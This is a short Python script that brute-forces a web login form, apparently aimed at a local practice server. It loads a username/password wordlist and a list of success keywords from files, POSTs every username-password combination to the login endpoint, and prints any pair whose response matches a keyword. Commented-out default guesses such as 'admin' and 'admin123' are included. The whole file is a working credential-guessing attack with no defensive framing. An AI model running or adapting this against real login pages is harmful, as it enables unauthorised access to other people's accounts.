import requests

target_url = "http://localhost:1111/auth/login"

found = False
# username_payload = ['admin', 'admin123', 'anshar']
# password_payload = ['admin', '123', 'admin123']
keyword_output = []

keyword_dictionary = input('File path keyword dictionary : ')
with open(keyword_dictionary, 'r') as kwd:
    keyword_output = [k.strip() for k in kwd]

file_path = input('File path username and password dictionary txt : ')

with open(file_path, 'r') as file:
    dict_txt = [i.strip() for i in file]

    for username in dict_txt:
        username_payload = username
        for password in dict_txt:
            password_payload = password
            data = {
                'username': username_payload,
                'password': password_payload,  
            }

            response = requests.post(target_url, data=data)
            # print(response.text)
            if any(keyword in response.text for keyword in keyword_output):
                print(f"Username logged use : {username_payload}")
                print(f"Password logged use : {password_payload}")
                found = True
        
    if found == False:
        print("Try again with others payloads")
